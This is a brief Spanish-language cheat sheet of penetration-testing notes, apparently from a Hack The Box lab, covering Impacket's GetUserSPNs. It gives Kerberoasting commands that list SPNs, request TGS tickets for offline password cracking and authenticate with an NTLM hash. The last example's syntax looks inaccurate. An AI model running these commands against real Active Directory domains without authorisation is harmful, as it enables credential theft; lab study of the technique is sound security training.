

```bash
impacket-GetUserSPNs manager.htb/operator:operator -request 
```

Comandos Más Usados:

1. **Listar SPNs asociados a cuentas de usuario:**

   ```bash
   GetUserSPNs.py <dominio>/<usuario>:<contraseña>
   ```

   * **Descripción**: Consulta el Active Directory para listar todos los SPNs asociados a cuentas de usuario.
2. **Especificar la dirección IP del Domain Controller (DC):**

   ```bash
   GetUserSPNs.py -dc-ip <IP_DC> <dominio>/<usuario>:<contraseña>
   ```

   * **Descripción**: Utiliza una dirección IP específica del controlador de dominio en lugar del nombre de dominio.
3. **Guardar los tickets TGS en formato de archivo:**

   ```bash
   GetUserSPNs.py -request -dc-ip <IP_DC> <dominio>/<usuario>:<contraseña>
   ```

   * **Descripción**: Solicita y guarda los tickets de servicio (TGS) en un archivo para intentar romper el cifrado de las contraseñas.
4. **Usar autenticación NTLM en lugar de contraseña:**

   ```bash
   GetUserSPNs.py <dominio>/<usuario>@<NTLM_HASH>
   ```

   * **Descripción**: Usa el hash NTLM de la contraseña para autenticarse en lugar de la contraseña en texto claro.